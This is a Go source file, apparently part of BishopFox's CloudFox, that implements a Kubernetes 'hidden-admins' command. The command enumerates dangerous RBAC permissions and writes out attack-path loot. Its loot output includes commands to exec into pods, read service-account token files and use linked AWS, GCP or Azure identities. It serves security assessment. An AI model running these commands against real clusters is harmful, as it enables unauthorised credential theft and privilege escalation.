package commands

import (
	"context"
	"fmt"
	"os"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	v1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

var HiddenAdminsCmd = &cobra.Command{
	Use:   "hidden-admins",
	Short: "Enumerate roles, users, groups, and service accounts with dangerous or escalatory permissions",
	Long: `
Identify hidden or dangerous administrators in a Kubernetes cluster. This includes:
  - Membership in system:masters group
  - Cluster-admin permissions
  - Ability to create/update Roles, ClusterRoles, RoleBindings, or ClusterRoleBindings
  - Ability to create/update Secrets or ConfigMaps
  - Impersonation rights
  - RBAC aggregation roles
  - Entities who can escalate privileges

Outputs detailed findings and attack paths:
  cloudfox kubernetes hidden-admins`,
	Run: ListHiddenAdmins,
}

type HiddenAdminFinding struct {
	Namespace      string
	Entity         string
	EntityType     string
	Scope          string
	RiskLevel      string
	DangerousPerms string
	Source         string
	CloudIAM       string // AWS/GCP/Azure IAM role
	ActivePods     int    // Number of pods using this SA
	IsDefault      bool   // Is this the default SA?
	IsWildcard     bool   // Wildcard group binding
}

type AttackPath struct {
	StartEntity string
	EntityType  string
	Steps       []string
	EndGoal     string
	RiskLevel   string
	Feasibility string // "Immediate", "Requires-Enum", "Complex"
}

type HiddenAdminsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

// Built-in dangerous roles with risk levels
var dangerousBuiltInRoles = map[string]string{
	"cluster-admin":  "CRITICAL",
	"admin":          "HIGH",
	"edit":           "MEDIUM",
	"system:masters": "CRITICAL",
	"system:controller:deployment-controller": "HIGH",
	"system:controller:replicaset-controller": "HIGH",
	"system:controller:daemon-set-controller": "HIGH",
	"system:controller:job-controller":        "HIGH",
	"system:node":                             "HIGH",
	"system:node-proxier":                     "MEDIUM",
	"system:kube-controller-manager":          "CRITICAL",
	"system:kube-scheduler":                   "HIGH",
}

func (h HiddenAdminsOutput) TableFiles() []internal.TableFile {
	return h.Table
}

func (h HiddenAdminsOutput) LootFiles() []internal.LootFile {
	return h.Loot
}

func (h HiddenAdminFinding) ToTableRow() []string {
	cloudIAM := h.CloudIAM
	if cloudIAM == "" {
		cloudIAM = "<NONE>"
	}

	activePods := fmt.Sprintf("%d", h.ActivePods)
	if h.ActivePods == 0 && h.EntityType != "ServiceAccount" {
		activePods = "N/A"
	}

	flags := ""
	if h.IsDefault {
		flags = "DEFAULT-SA"
	}
	if h.IsWildcard {
		if flags != "" {
			flags += ", "
		}
		flags += "WILDCARD"
	}
	if flags == "" {
		flags = "-"
	}

	return []string{
		h.RiskLevel,
		h.Namespace,
		h.Entity,
		h.EntityType,
		h.Scope,
		h.DangerousPerms,
		cloudIAM,
		activePods,
		flags,
		h.Source,
	}
}

func (h HiddenAdminFinding) Loot() string {
	return fmt.Sprintf(
		"[Hidden Admin Detection]\nRisk Level: %s\nNamespace: %s\nEntity: %s (%s)\nScope: %s\nSource: %s\nDangerous Permissions: %s\n",
		h.RiskLevel,
		h.Namespace,
		h.Entity,
		h.EntityType,
		h.Scope,
		h.Source,
		h.DangerousPerms,
	)
}

func ListHiddenAdmins(cmd *cobra.Command, args []string) {
	ctx := context.Background()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating hidden admin permissions for %s", globals.ClusterName), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	headers := []string{"Risk", "Namespace", "Entity", "Type", "Scope", "Dangerous Permissions", "Cloud IAM", "Active Pods", "Flags", "Source"}
	var tableRows [][]string
	var lootLines []string
	var attackPaths []AttackPath

	// Risk statistics tracking
	riskCounts := map[string]int{
		"CRITICAL": 0,
		"HIGH":     0,
		"MEDIUM":   0,
		"LOW":      0,
	}

	// Query all ServiceAccounts to detect cloud IAM annotations
	serviceAccountCloudIAM := make(map[string]map[string]string) // namespace -> sa name -> cloud IAM
	serviceAccountPodCount := make(map[string]map[string]int)    // namespace -> sa name -> pod count

	logger.InfoM("Scanning ServiceAccounts for cloud IAM annotations...", globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
	serviceAccounts, err := clientset.CoreV1().ServiceAccounts("").List(ctx, v1.ListOptions{})
	if err == nil {
		for _, sa := range serviceAccounts.Items {
			if serviceAccountCloudIAM[sa.Namespace] == nil {
				serviceAccountCloudIAM[sa.Namespace] = make(map[string]string)
			}
			if serviceAccountPodCount[sa.Namespace] == nil {
				serviceAccountPodCount[sa.Namespace] = make(map[string]int)
			}

			// Check for AWS IRSA (IAM Roles for ServiceAccounts)
			if roleARN, ok := sa.Annotations["eks.amazonaws.com/role-arn"]; ok {
				serviceAccountCloudIAM[sa.Namespace][sa.Name] = fmt.Sprintf("AWS: %s", roleARN)
			}

			// Check for GCP Workload Identity
			if gcpSA, ok := sa.Annotations["iam.gke.io/gcp-service-account"]; ok {
				serviceAccountCloudIAM[sa.Namespace][sa.Name] = fmt.Sprintf("GCP: %s", gcpSA)
			}

			// Check for Azure Pod Identity
			if azureID, ok := sa.Annotations["azure.workload.identity/client-id"]; ok {
				serviceAccountCloudIAM[sa.Namespace][sa.Name] = fmt.Sprintf("Azure: %s", azureID)
			}
		}
	}

	// Count active pods per ServiceAccount
	logger.InfoM("Counting active pods per ServiceAccount...", globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
	allPods, err := clientset.CoreV1().Pods("").List(ctx, v1.ListOptions{})
	if err == nil {
		for _, pod := range allPods.Items {
			saName := pod.Spec.ServiceAccountName
			if saName == "" {
				saName = "default"
			}
			if serviceAccountPodCount[pod.Namespace] == nil {
				serviceAccountPodCount[pod.Namespace] = make(map[string]int)
			}
			serviceAccountPodCount[pod.Namespace][saName]++
		}
	}

	// ClusterRoles
	clusterRoles, err := clientset.RbacV1().ClusterRoles().List(ctx, v1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error fetching ClusterRoles: %v", err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
		return
	}
	for _, role := range clusterRoles.Items {
		var findings []string
		highestRisk := ""

		// Check if this is a built-in dangerous role
		if builtInRisk, isBuiltInDangerous := dangerousBuiltInRoles[role.Name]; isBuiltInDangerous {
			findings = append(findings, fmt.Sprintf("Built-in dangerous role: %s", role.Name))
			highestRisk = builtInRisk
		}

		if role.Name == "cluster-admin" {
			findings = append(findings, "cluster-admin role (full cluster control)")
			highestRisk = "CRITICAL"
		}
		if strings.Contains(role.Name, "system:masters") {
			findings = append(findings, "member of system:masters group")
			highestRisk = "CRITICAL"
		}
		if role.AggregationRule != nil && role.AggregationRule.ClusterRoleSelectors != nil && len(role.AggregationRule.ClusterRoleSelectors) > 0 {
			findings = append(findings, "RBAC Aggregation role")
		}
		if role.Rules != nil {
			for _, rule := range role.Rules {
				if k8sinternal.IsDangerousRule(rule) {
					riskLevel := k8sinternal.GetRuleRiskLevel(rule)
					riskDesc := k8sinternal.GetRuleRiskDescription(rule)
					findings = append(findings, riskDesc)

					// Track highest risk level
					if highestRisk == "" || (riskLevel == "CRITICAL") || (riskLevel == "HIGH" && highestRisk != "CRITICAL") {
						highestRisk = riskLevel
					}
				}
			}
		}
		if len(findings) > 0 {
			if highestRisk == "" {
				highestRisk = "MEDIUM"
			}
			riskCounts[highestRisk]++
			row := HiddenAdminFinding{
				Namespace:      "<cluster>",
				Entity:         role.Name,
				EntityType:     "ClusterRole",
				Scope:          "cluster",
				RiskLevel:      highestRisk,
				DangerousPerms: strings.Join(findings, "; "),
				Source:         "ClusterRole definition",
			}
			tableRows = append(tableRows, row.ToTableRow())
			lootLines = append(lootLines, row.Loot())
		}
	}

	// ClusterRoleBindings
	crbs, err := clientset.RbacV1().ClusterRoleBindings().List(ctx, v1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error fetching ClusterRoleBindings: %v", err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
		return
	}
	for _, binding := range crbs.Items {
		if binding.Subjects != nil {
			for _, subject := range binding.Subjects {
				ns := subject.Namespace
				if ns == "" {
					ns = "<cluster>"
				}
				role := binding.RoleRef.Name
				riskLevel := ""
				isWildcard := false
				isDefault := false
				cloudIAM := ""
				activePods := 0

				// Detect wildcard group bindings
				if subject.Kind == "Group" {
					if subject.Name == "system:serviceaccounts" {
						isWildcard = true
						riskLevel = "CRITICAL"
						// Create attack path for wildcard binding
						attackPaths = append(attackPaths, AttackPath{
							StartEntity: "system:serviceaccounts (ALL ServiceAccounts)",
							EntityType:  "Group",
							Steps: []string{
								"ANY ServiceAccount in ANY namespace can authenticate",
								fmt.Sprintf("Bound to ClusterRole: %s", role),
								"Full cluster-wide access through group membership",
							},
							EndGoal:     "Cluster-wide privilege escalation via any ServiceAccount",
							RiskLevel:   "CRITICAL",
							Feasibility: "Immediate",
						})
					} else if strings.HasPrefix(subject.Name, "system:serviceaccounts:") {
						isWildcard = true
						wildcardNS := strings.TrimPrefix(subject.Name, "system:serviceaccounts:")
						riskLevel = "HIGH"
						// Create attack path for namespace wildcard binding
						attackPaths = append(attackPaths, AttackPath{
							StartEntity: fmt.Sprintf("system:serviceaccounts:%s (ALL SAs in %s)", wildcardNS, wildcardNS),
							EntityType:  "Group",
							Steps: []string{
								fmt.Sprintf("ANY ServiceAccount in namespace '%s' can authenticate", wildcardNS),
								fmt.Sprintf("Bound to ClusterRole: %s", role),
								"Namespace-wide access to cluster-level permissions",
							},
							EndGoal:     fmt.Sprintf("Privilege escalation via any ServiceAccount in %s", wildcardNS),
							RiskLevel:   "HIGH",
							Feasibility: "Immediate",
						})
					}
				}

				// Detect default ServiceAccount elevations
				if subject.Kind == "ServiceAccount" && subject.Name == "default" {
					isDefault = true
					// Escalate risk for default SA
					if riskLevel == "" || riskLevel == "MEDIUM" {
						riskLevel = "HIGH"
					} else if riskLevel == "HIGH" {
						riskLevel = "CRITICAL"
					}
					// Create attack path for default SA elevation
					attackPaths = append(attackPaths, AttackPath{
						StartEntity: fmt.Sprintf("default ServiceAccount (%s)", ns),
						EntityType:  "ServiceAccount",
						Steps: []string{
							"Default ServiceAccount has elevated permissions",
							fmt.Sprintf("Bound to ClusterRole: %s", role),
							"All pods without explicit SA use this account",
						},
						EndGoal:     "Privilege escalation through implicit ServiceAccount",
						RiskLevel:   riskLevel,
						Feasibility: "Immediate",
					})
				}

				// Get cloud IAM and pod count for ServiceAccounts
				if subject.Kind == "ServiceAccount" && ns != "<cluster>" {
					if saCloudIAM, ok := serviceAccountCloudIAM[ns][subject.Name]; ok {
						cloudIAM = saCloudIAM
						// Create attack path for cloud IAM crosswalk
						attackPaths = append(attackPaths, AttackPath{
							StartEntity: fmt.Sprintf("%s/%s", ns, subject.Name),
							EntityType:  "ServiceAccount",
							Steps: []string{
								fmt.Sprintf("K8s: Bound to ClusterRole %s", role),
								fmt.Sprintf("Cloud: %s", cloudIAM),
								"Compromise pod → K8s cluster access + Cloud IAM access",
							},
							EndGoal:     "Multi-cloud privilege escalation (K8s + Cloud Provider)",
							RiskLevel:   "CRITICAL",
							Feasibility: "Requires-Enum",
						})
					}
					if podCount, ok := serviceAccountPodCount[ns][subject.Name]; ok {
						activePods = podCount
					}
				}

				// Check built-in dangerous roles
				if builtInRisk, isDangerous := dangerousBuiltInRoles[role]; isDangerous {
					if riskLevel == "" || (builtInRisk == "CRITICAL") || (builtInRisk == "HIGH" && riskLevel != "CRITICAL") {
						riskLevel = builtInRisk
					}
				}

				if role == "cluster-admin" || role == "system:masters" {
					riskLevel = "CRITICAL"
				} else if role == "admin" || role == "edit" {
					if riskLevel == "" {
						riskLevel = "HIGH"
					}
				}

				if riskLevel != "" {
					riskCounts[riskLevel]++
					row := HiddenAdminFinding{
						Namespace:      ns,
						Entity:         subject.Name,
						EntityType:     subject.Kind,
						Scope:          "cluster",
						RiskLevel:      riskLevel,
						DangerousPerms: fmt.Sprintf("bound to ClusterRole %s", role),
						Source:         fmt.Sprintf("ClusterRoleBinding %s", binding.Name),
						CloudIAM:       cloudIAM,
						ActivePods:     activePods,
						IsDefault:      isDefault,
						IsWildcard:     isWildcard,
					}
					tableRows = append(tableRows, row.ToTableRow())
					lootLines = append(lootLines, row.Loot())
				}
			}
		}
	}

	// Roles & RoleBindings
	namespaces, err := clientset.CoreV1().Namespaces().List(ctx, v1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error fetching Namespaces: %v", err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
		return
	}
	for _, ns := range namespaces.Items {
		// Build map of dangerous roles in this namespace
		dangerousRolesInNS := make(map[string][]string) // roleName -> []findings

		roles, err := clientset.RbacV1().Roles(ns.Name).List(ctx, v1.ListOptions{})
		if err != nil {
			logger.ErrorM(fmt.Sprintf("Error fetching Roles in namespace %s: %v", ns.Name, err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
			continue
		}
		for _, role := range roles.Items {
			var findings []string
			highestRisk := ""

			if role.Rules != nil {
				for _, rule := range role.Rules {
					if k8sinternal.IsDangerousRule(rule) {
						riskLevel := k8sinternal.GetRuleRiskLevel(rule)
						riskDesc := k8sinternal.GetRuleRiskDescription(rule)
						findings = append(findings, riskDesc)

						// Track highest risk level
						if highestRisk == "" || (riskLevel == "CRITICAL") || (riskLevel == "HIGH" && highestRisk != "CRITICAL") || (riskLevel == "MEDIUM" && highestRisk != "CRITICAL" && highestRisk != "HIGH") {
							highestRisk = riskLevel
						}
					}
				}
			}
			if len(findings) > 0 {
				if highestRisk == "" {
					highestRisk = "MEDIUM"
				}
				riskCounts[highestRisk]++
				dangerousRolesInNS[role.Name] = findings
				row := HiddenAdminFinding{
					Namespace:      ns.Name,
					Entity:         role.Name,
					EntityType:     "Role",
					Scope:          "namespace",
					RiskLevel:      highestRisk,
					DangerousPerms: strings.Join(findings, "; "),
					Source:         fmt.Sprintf("Role definition (%s)", role.Name),
				}
				tableRows = append(tableRows, row.ToTableRow())
				lootLines = append(lootLines, row.Loot())
			}
		}

		rbs, err := clientset.RbacV1().RoleBindings(ns.Name).List(ctx, v1.ListOptions{})
		if err != nil {
			logger.ErrorM(fmt.Sprintf("Error fetching RoleBindings in namespace %s: %v", ns.Name, err), globals.K8S_HIDDEN_ADMINS_MODULE_NAME)
			continue
		}
		for _, binding := range rbs.Items {
			if binding.Subjects != nil {
				// Check if the role being bound is dangerous
				roleName := binding.RoleRef.Name
				var isDangerousBinding bool
				var bindingPerms string
				var riskLevel string

				// Check if it's a dangerous namespaced role
				if findings, ok := dangerousRolesInNS[roleName]; ok {
					isDangerousBinding = true
					bindingPerms = fmt.Sprintf("bound to Role %s with: %s", roleName, strings.Join(findings, "; "))
					riskLevel = "HIGH"
				}

				// Check if it's binding to a ClusterRole (which might be cluster-admin or other dangerous ClusterRole)
				if binding.RoleRef.Kind == "ClusterRole" {
					if roleName == "cluster-admin" || strings.Contains(roleName, "system:masters") {
						isDangerousBinding = true
						bindingPerms = fmt.Sprintf("bound to ClusterRole %s (namespace-scoped)", roleName)
						riskLevel = "CRITICAL"
					} else if roleName == "admin" {
						isDangerousBinding = true
						bindingPerms = fmt.Sprintf("bound to ClusterRole %s (namespace-scoped)", roleName)
						riskLevel = "HIGH"
					} else if roleName == "edit" {
						isDangerousBinding = true
						bindingPerms = fmt.Sprintf("bound to ClusterRole %s (namespace-scoped)", roleName)
						riskLevel = "MEDIUM"
					}
				}

				// Only add subjects if this is a dangerous binding
				if isDangerousBinding {
					if riskLevel == "" {
						riskLevel = "MEDIUM"
					}
					for _, subject := range binding.Subjects {
						cloudIAM := ""
						activePods := 0
						isDefault := false

						// Detect default ServiceAccount in namespace bindings
						if subject.Kind == "ServiceAccount" && subject.Name == "default" {
							isDefault = true
							// Escalate risk for default SA
							if riskLevel == "MEDIUM" {
								riskLevel = "HIGH"
							} else if riskLevel == "HIGH" {
								riskLevel = "CRITICAL"
							}
						}

						// Get cloud IAM and pod count for ServiceAccounts
						if subject.Kind == "ServiceAccount" {
							if saCloudIAM, ok := serviceAccountCloudIAM[ns.Name][subject.Name]; ok {
								cloudIAM = saCloudIAM
							}
							if podCount, ok := serviceAccountPodCount[ns.Name][subject.Name]; ok {
								activePods = podCount
							}
						}

						riskCounts[riskLevel]++
						row := HiddenAdminFinding{
							Namespace:      ns.Name,
							Entity:         subject.Name,
							EntityType:     subject.Kind,
							Scope:          "namespace",
							RiskLevel:      riskLevel,
							DangerousPerms: bindingPerms,
							Source:         fmt.Sprintf("RoleBinding %s", binding.Name),
							CloudIAM:       cloudIAM,
							ActivePods:     activePods,
							IsDefault:      isDefault,
							IsWildcard:     false,
						}
						tableRows = append(tableRows, row.ToTableRow())
						lootLines = append(lootLines, row.Loot())
					}
				}
			}
		}
	}

	// Cross-reference ServiceAccounts with running pods
	var lootSAPodsMap []string
	lootSAPodsMap = append(lootSAPodsMap, `#####################################
##### ServiceAccount to Pod Mapping
#####################################
#
# Which pods are running with dangerous ServiceAccounts
# This helps identify active attack vectors
#
`)

	if globals.KubeContext != "" {
		lootSAPodsMap = append(lootSAPodsMap, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	// Build a map of dangerous service accounts
	dangerousSAs := make(map[string]map[string]string) // namespace -> sa -> risk level
	for _, row := range tableRows {
		// Extract namespace, entity, type, and risk level from table rows
		if len(row) >= 5 {
			ns := row[0]
			entity := row[1]
			entityType := row[2]
			riskLevel := row[4]

			if entityType == "ServiceAccount" {
				if dangerousSAs[ns] == nil {
					dangerousSAs[ns] = make(map[string]string)
				}
				dangerousSAs[ns][entity] = riskLevel
			}
		}
	}

	// Query pods to find which ones use these dangerous SAs
	if len(dangerousSAs) > 0 {
		for ns := range dangerousSAs {
			if ns == "<cluster>" {
				continue // Skip cluster-level entries
			}
			pods, err := clientset.CoreV1().Pods(ns).List(ctx, v1.ListOptions{})
			if err != nil {
				continue
			}

			for _, pod := range pods.Items {
				saName := pod.Spec.ServiceAccountName
				if saName == "" {
					saName = "default"
				}

				if riskLevel, found := dangerousSAs[ns][saName]; found {
					lootSAPodsMap = append(lootSAPodsMap, fmt.Sprintf("\n# [%s] Pod: %s/%s uses dangerous ServiceAccount: %s",
						riskLevel, ns, pod.Name, saName))
					lootSAPodsMap = append(lootSAPodsMap, fmt.Sprintf("# Node: %s, Status: %s", pod.Spec.NodeName, pod.Status.Phase))
					lootSAPodsMap = append(lootSAPodsMap, fmt.Sprintf("kubectl exec -it %s -n %s -- /bin/sh", pod.Name, ns))
					lootSAPodsMap = append(lootSAPodsMap, fmt.Sprintf("# Inside pod, extract SA token: cat /var/run/secrets/kubernetes.io/serviceaccount/token"))
					lootSAPodsMap = append(lootSAPodsMap, "")
				}
			}
		}

		if len(lootSAPodsMap) == 2 {
			lootSAPodsMap = append(lootSAPodsMap, "\n# No running pods found using dangerous ServiceAccounts")
			lootSAPodsMap = append(lootSAPodsMap, "# This is good - dangerous SAs exist but aren't actively in use")
		}
	} else {
		lootSAPodsMap = append(lootSAPodsMap, "\n# No dangerous ServiceAccounts detected in findings")
	}

	// Build Attack Path Chains loot file
	var lootAttackPaths []string
	lootAttackPaths = append(lootAttackPaths, `#####################################
##### Attack Path Chain Analysis
#####################################
#
# Multi-step privilege escalation paths
# Visualizes how attackers can chain permissions
#
`)

	if len(attackPaths) > 0 {
		for i, path := range attackPaths {
			lootAttackPaths = append(lootAttackPaths, fmt.Sprintf("\n## Attack Path #%d [%s - %s]", i+1, path.RiskLevel, path.Feasibility))
			lootAttackPaths = append(lootAttackPaths, fmt.Sprintf("Start: %s (%s)", path.StartEntity, path.EntityType))
			lootAttackPaths = append(lootAttackPaths, "\nSteps:")
			for stepNum, step := range path.Steps {
				lootAttackPaths = append(lootAttackPaths, fmt.Sprintf("  %d. %s", stepNum+1, step))
			}
			lootAttackPaths = append(lootAttackPaths, fmt.Sprintf("\nEnd Goal: %s", path.EndGoal))
			lootAttackPaths = append(lootAttackPaths, "\n---")
		}
	} else {
		lootAttackPaths = append(lootAttackPaths, "\n# No attack paths detected")
	}

	// Build Cloud IAM Crosswalk loot file
	var lootCloudIAM []string
	lootCloudIAM = append(lootCloudIAM, `#####################################
##### Cloud IAM Crosswalk Analysis
#####################################
#
# Kubernetes ServiceAccounts with Cloud IAM roles
# Compromising these SAs gives BOTH K8s and Cloud access
#
`)

	if globals.KubeContext != "" {
		lootCloudIAM = append(lootCloudIAM, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	hasCloudIAM := false
	for ns, saMap := range serviceAccountCloudIAM {
		for saName, cloudRole := range saMap {
			hasCloudIAM = true
			podCount := 0
			if serviceAccountPodCount[ns] != nil {
				podCount = serviceAccountPodCount[ns][saName]
			}

			lootCloudIAM = append(lootCloudIAM, fmt.Sprintf("\n## ServiceAccount: %s/%s", ns, saName))
			lootCloudIAM = append(lootCloudIAM, fmt.Sprintf("Cloud IAM: %s", cloudRole))
			lootCloudIAM = append(lootCloudIAM, fmt.Sprintf("Active Pods: %d", podCount))
			lootCloudIAM = append(lootCloudIAM, "\n# Exploitation:")
			lootCloudIAM = append(lootCloudIAM, fmt.Sprintf("kubectl get pods -n %s -o json | jq '.items[] | select(.spec.serviceAccountName==\"%s\") | .metadata.name'", ns, saName))
			lootCloudIAM = append(lootCloudIAM, fmt.Sprintf("kubectl exec -it <pod-name> -n %s -- /bin/sh", ns))
			lootCloudIAM = append(lootCloudIAM, "# Inside pod:")
			lootCloudIAM = append(lootCloudIAM, "cat /var/run/secrets/kubernetes.io/serviceaccount/token")

			if strings.HasPrefix(cloudRole, "AWS:") {
				lootCloudIAM = append(lootCloudIAM, "# For AWS IRSA:")
				lootCloudIAM = append(lootCloudIAM, "aws sts get-caller-identity")
				lootCloudIAM = append(lootCloudIAM, "aws s3 ls")
			} else if strings.HasPrefix(cloudRole, "GCP:") {
				lootCloudIAM = append(lootCloudIAM, "# For GCP Workload Identity:")
				lootCloudIAM = append(lootCloudIAM, "gcloud auth list")
				lootCloudIAM = append(lootCloudIAM, "gcloud projects list")
			} else if strings.HasPrefix(cloudRole, "Azure:") {
				lootCloudIAM = append(lootCloudIAM, "# For Azure Pod Identity:")
				lootCloudIAM = append(lootCloudIAM, "az account show")
				lootCloudIAM = append(lootCloudIAM, "az resource list")
			}
			lootCloudIAM = append(lootCloudIAM, "")
		}
	}

	if !hasCloudIAM {
		lootCloudIAM = append(lootCloudIAM, "\n# No ServiceAccounts with cloud IAM annotations detected")
		lootCloudIAM = append(lootCloudIAM, "# This is good - no K8s-to-Cloud privilege escalation paths")
	}

	// Build Risk Dashboard loot file
	var lootRiskDashboard []string
	lootRiskDashboard = append(lootRiskDashboard, `#####################################
##### Risk Statistics Dashboard
#####################################
#
# Summary of dangerous permissions by risk level
#
`)

	totalFindings := riskCounts["CRITICAL"] + riskCounts["HIGH"] + riskCounts["MEDIUM"] + riskCounts["LOW"]
	lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("\n## Overall Statistics"))
	lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("Total Findings: %d", totalFindings))
	lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("CRITICAL Risk: %d", riskCounts["CRITICAL"]))
	lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("HIGH Risk:     %d", riskCounts["HIGH"]))
	lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("MEDIUM Risk:   %d", riskCounts["MEDIUM"]))
	lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("LOW Risk:      %d", riskCounts["LOW"]))

	lootRiskDashboard = append(lootRiskDashboard, "\n## Attack Paths")
	lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("Total Attack Paths Identified: %d", len(attackPaths)))

	criticalPaths := 0
	highPaths := 0
	immediatePaths := 0
	for _, path := range attackPaths {
		if path.RiskLevel == "CRITICAL" {
			criticalPaths++
		} else if path.RiskLevel == "HIGH" {
			highPaths++
		}
		if path.Feasibility == "Immediate" {
			immediatePaths++
		}
	}
	lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("  CRITICAL: %d", criticalPaths))
	lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("  HIGH: %d", highPaths))
	lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("  Immediate Exploitation: %d", immediatePaths))

	lootRiskDashboard = append(lootRiskDashboard, "\n## Cloud IAM Integration")
	cloudIAMCount := 0
	for _, saMap := range serviceAccountCloudIAM {
		cloudIAMCount += len(saMap)
	}
	lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("ServiceAccounts with Cloud IAM: %d", cloudIAMCount))

	defaultSACount := 0
	wildcardCount := 0
	for _, row := range tableRows {
		if len(row) >= 9 {
			flags := row[8]
			if strings.Contains(flags, "DEFAULT-SA") {
				defaultSACount++
			}
			if strings.Contains(flags, "WILDCARD") {
				wildcardCount++
			}
		}
	}
	lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("\n## Critical Misconfigurations"))
	lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("Default ServiceAccounts with Elevated Permissions: %d", defaultSACount))
	lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("Wildcard ServiceAccount Group Bindings: %d", wildcardCount))

	lootRiskDashboard = append(lootRiskDashboard, "\n## Recommendations")
	if riskCounts["CRITICAL"] > 0 {
		lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("⚠️  URGENT: %d CRITICAL findings require immediate remediation", riskCounts["CRITICAL"]))
	}
	if wildcardCount > 0 {
		lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("⚠️  URGENT: %d wildcard bindings grant excessive permissions", wildcardCount))
	}
	if defaultSACount > 0 {
		lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("⚠️  WARNING: %d default ServiceAccounts have elevated permissions", defaultSACount))
	}
	if cloudIAMCount > 0 {
		lootRiskDashboard = append(lootRiskDashboard, fmt.Sprintf("ℹ️  INFO: %d ServiceAccounts have cloud IAM roles - ensure least privilege", cloudIAMCount))
	}

	var lootEnum []string
	lootEnum = append(lootEnum, `#####################################
##### Enumerate Dangerous Permissions
#####################################

`)
	if globals.KubeContext != "" {
		lootEnum = append(lootEnum, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	lootEnum = append(lootEnum, `
# Check for system:masters membership
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.name == "system:masters")'
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]?.name=="system:masters")'

# Find impersonation rules
kubectl get clusterroles -o json | jq '.items[] | select(.rules[]? | .verbs[]? | ascii_downcase == "impersonate")'
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]?=="impersonate") | .metadata.name, .rules[]? | select(.verbs[]?=="impersonate")'

# Find Role/ClusterRole creation permissions
kubectl get clusterroles -o json | jq '.items[] | select(.rules[]? | (.verbs[]? | ascii_downcase == "create") and (.resources[]? | ascii_downcase | contains("role") ))'

# Find ConfigMap and Secret modification permissions
kubectl get clusterroles -o json | jq '.items[] | select(.rules[]? | (.verbs[]? | ascii_downcase == "create" or ascii_downcase == "update") and (.resources[]? | ascii_downcase | contains("secret") or contains("configmap") ))'

# Check who can bind cluster-admin
kubectl get clusterroles -o json | jq '.items[] | select(.metadata.name == "cluster-admin")'

# Find cluster-admin bindings (Any subject (User, Group, ServiceAccount) bound to the cluster-admin role.)
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .metadata.name, .subjects[]? | "\(.kind):\(.name) (ns=\(.namespace // "cluster-scope"))"'

# Roles that can escalate privileges via RBAC editing
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("roles|clusterroles|rolebindings|clusterrolebindings"))) | .metadata.name, .rules[]'

# Create/modify secrets
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]?=="secrets") and (.verbs[]? | test("create|update|patch|get"))) | .metadata.name'

# Create/modify configmaps
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]?=="configmaps") and (.verbs[]? | test("create|update|patch"))) | .metadata.name'

# Wildcard permissions - CRITICAL
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.verbs[]? == "*" or .resources[]? == "*")) | .metadata.name'

# Pod execution permissions
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("pods/exec|pods/attach|pods/portforward")) and (.verbs[]? | test("create|get"))) | .metadata.name'

# Admission webhook control - CRITICAL
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("validatingwebhookconfigurations|mutatingwebhookconfigurations")) and (.verbs[]? | test("create|update|patch"))) | .metadata.name'

# Certificate approval - HIGH
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("certificatesigningrequests")) and (.verbs[]? | test("create|update|approve"))) | .metadata.name'

# Node modification - HIGH
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("nodes")) and (.verbs[]? | test("create|update|patch|delete"))) | .metadata.name'

# Namespace-Scoped Permissions

# Namespace-level cluster-admin equivalents
